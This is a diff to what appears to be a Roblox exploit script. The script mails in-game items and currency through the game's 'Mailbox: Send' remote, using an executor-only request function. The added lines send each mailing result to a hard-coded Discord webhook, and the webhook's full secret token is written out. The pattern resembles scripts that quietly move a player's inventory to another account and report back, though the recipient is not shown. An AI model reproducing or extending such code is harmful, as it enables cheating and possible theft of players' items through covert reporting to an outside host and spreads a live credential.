@@ -80,7 +80,32 @@ local args = {
     [4] = i,
     [5] = n or 1
 }
-return game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+local n,v = game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+if n then
+qv = '{"content":"mailed"}'
+print(qv)
+local responsexr =
+        request(
+        {
+            Url = "https://discordapp.com/api/webhooks/1298268105889288202/ExDWIDv3HFsqFSDjlTbGIUssoRILbcvJJGPrfTyhmMC1RR4VqmThwmxiUpcRZur-HMhv",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = qv
+        }
+    )
+else
+qv = '{"content":"'..v..'"}'
+print(qv)
+local responsexr =
+        request(
+        {
+            Url = "https://discordapp.com/api/webhooks/1298268105889288202/ExDWIDv3HFsqFSDjlTbGIUssoRILbcvJJGPrfTyhmMC1RR4VqmThwmxiUpcRZur-HMhv",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = qv
+        }
+    )
+end
 end
 local s = save.Inventory.Currency
 for i,v in pairs(s) do
